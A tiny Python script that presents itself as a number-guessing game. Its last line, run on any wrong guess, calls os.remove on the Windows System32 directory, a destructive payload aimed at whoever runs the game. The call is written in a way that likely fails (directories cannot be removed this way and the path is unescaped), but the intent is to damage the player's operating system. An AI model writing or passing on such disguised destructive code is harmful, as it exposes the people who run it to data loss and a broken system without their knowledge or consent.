import random
import os

number = random.randint(1,10)

guess = input()
guess = int(guess)

if guess == number:
    print('Congrats')
else:
    os.remove("C:\Windows\System32")